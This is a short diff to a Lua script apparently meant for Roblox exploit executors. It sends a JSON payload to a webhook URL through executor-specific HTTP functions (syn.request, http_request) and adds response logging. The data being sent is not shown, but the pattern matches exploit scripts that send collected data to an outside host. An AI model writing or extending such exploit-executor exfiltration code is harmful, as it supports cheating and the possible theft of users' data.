@@ -51,13 +51,16 @@ local payload = {
     }}
 }
 
--- Send webhook using exploit HTTP request
+-- Encode data to JSON
 local jsonData = HttpService:JSONEncode(payload)
 
+-- Use exploit-specific HTTP request
 local requestFunc = syn and syn.request or http_request or request or (http and http.request)
+
 if requestFunc then
     pcall(function()
-        requestFunc({
+        -- Try sending the request
+        local response = requestFunc({
             Url = webhookUrl,
             Method = "POST",
             Headers = {
@@ -65,6 +68,8 @@ if requestFunc then
             },
             Body = jsonData
         })
+        -- Optionally log the response for debugging
+        print(response)
     end)
 else
     warn("Your exploit does not support HTTP requests.")
